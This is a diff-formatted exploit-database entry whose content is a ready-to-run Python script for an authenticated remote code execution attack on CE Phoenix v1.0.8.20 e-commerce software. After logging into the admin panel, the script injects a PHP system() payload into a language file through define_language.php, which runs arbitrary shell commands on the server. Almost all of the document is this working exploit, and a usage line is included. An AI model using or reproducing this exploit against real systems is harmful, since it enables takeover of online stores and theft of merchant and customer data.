@@ -1,0 +1,146 @@
+id: 39172
+date: 11/30/2023
+title: CE Phoenix 1.0.8.20 Remote Code Execution Exploit
+author: tmrswrr
+cves: 
+
+## Exploit Title: CE Phoenix v1.0.8.20 - Remote Code Execution (RCE) (Authenticated)
+#### Date: 2023-11-25
+#### Exploit Author: tmrswrr
+#### Category: Webapps
+#### Vendor Homepage: [CE Phoenix](https://phoenixcart.org/)
+#### Version: v1.0.8.20
+#### Tested on: [Softaculous Demo - CE Phoenix](https://www.softaculous.com/apps/ecommerce/CE_Phoenix)
+
+## EXPLOIT :
+
+import requests
+from bs4 import BeautifulSoup
+import sys
+import urllib.parse
+import random
+from time import sleep
+
+class colors:
+    OKBLUE = '\033[94m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    CBLACK = '\33[30m'
+    CRED = '\33[31m'
+    CGREEN = '\33[32m'
+    CYELLOW = '\33[33m'
+    CBLUE = '\33[34m'
+    CVIOLET = '\33[35m'
+    CBEIGE = '\33[36m'
+    CWHITE = '\33[37m'
+
+ 
+def entry_banner():
+    color_random = [colors.CBLUE, colors.CVIOLET, colors.CWHITE, colors.OKBLUE, colors.CGREEN, colors.WARNING,
+                    colors.CRED, colors.CBEIGE]
+    random.shuffle(color_random)
+
+    banner = color_random[0] + """
+     CE Phoenix v1.0.8.20 - Remote Code Execution \n
+     Author: tmrswrr
+    """
+    for char in banner:
+        print(char, end='')
+        sys.stdout.flush()
+        sleep(0.0045)
+
+def get_formid_and_cookies(session, url):
+    response = session.get(url, allow_redirects=True)
+    if response.ok:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        formid_input = soup.find('input', {'name': 'formid'})
+        if formid_input:
+            return formid_input['value'], session.cookies
+    return None, None
+
+def perform_exploit(session, url, username, password, command):
+    print("\n[+] Attempting to exploit the target...")
+
+   
+    initial_url = url + "/admin/define_language.php?lngdir=english&filename=english.php"
+    formid, cookies = get_formid_and_cookies(session, initial_url)
+    if not formid:
+        print("[-] Failed to retrieve initial formid.")
+        return
+
+    # Login
+    print("[+] Performing login...")
+    login_payload = {
+        'formid': formid,
+        'username': username,
+        'password': password
+    }
+    login_headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Cookie': f'cepcAdminID={cookies["cepcAdminID"]}',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
+        'Referer': initial_url
+    }
+    login_url = url + "/admin/login.php?action=process"
+    login_response = session.post(login_url, data=login_payload, headers=login_headers, allow_redirects=True)
+
+    if not login_response.ok:
+        print("[-] Login failed.")
+        print(login_response.text)
+        return
+
+    print("[+] Login successful.")
+
+
+    new_formid, _ = get_formid_and_cookies(session, login_response.url)
+    if not new_formid:
+        print("[-] Failed to retrieve new formid after login.")
+        return
+
+    # Exploit
+    print("[+] Executing the exploit...")
+    encoded_command = urllib.parse.quote_plus(command)
+    exploit_payload = f"formid={new_formid}&file_contents=%3C%3Fphp+echo+system%28%27{encoded_command}%27%29%3B"
+    exploit_headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Cookie': f'cepcAdminID={cookies["cepcAdminID"]}',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
+        'Referer': login_response.url
+    }
+    exploit_url = url + "/admin/define_language.php?lngdir=english&filename=english.php&action=save"
+    exploit_response = session.post(exploit_url, data=exploit_payload, headers=exploit_headers, allow_redirects=True)
+
+    if exploit_response.ok:
+        print("[+] Exploit executed successfully.")
+    else:
+        print("[-] Exploit failed.")
+        print(exploit_response.text)
+
+    
+    final_response = session.get(url)
+    print("\n[+] Executed Command Output:\n")
+    print(final_response.text)  
+
+def main(base_url, username, password, command):
+    print("\n[+] Starting the exploitation process...")
+    session = requests.Session()
+    perform_exploit(session, base_url, username, password, command)
+
+if __name__ == "__main__":
+    entry_banner()
+
+    if len(sys.argv) < 5:
+        print("Usage: python script.py [URL] [username] [password] [command]")
+        sys.exit(1)
+
+    base_url = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    command = sys.argv[4]
+
+    main(base_url, username, password, command)
+
+#  0day.today [2023-12-10]  #
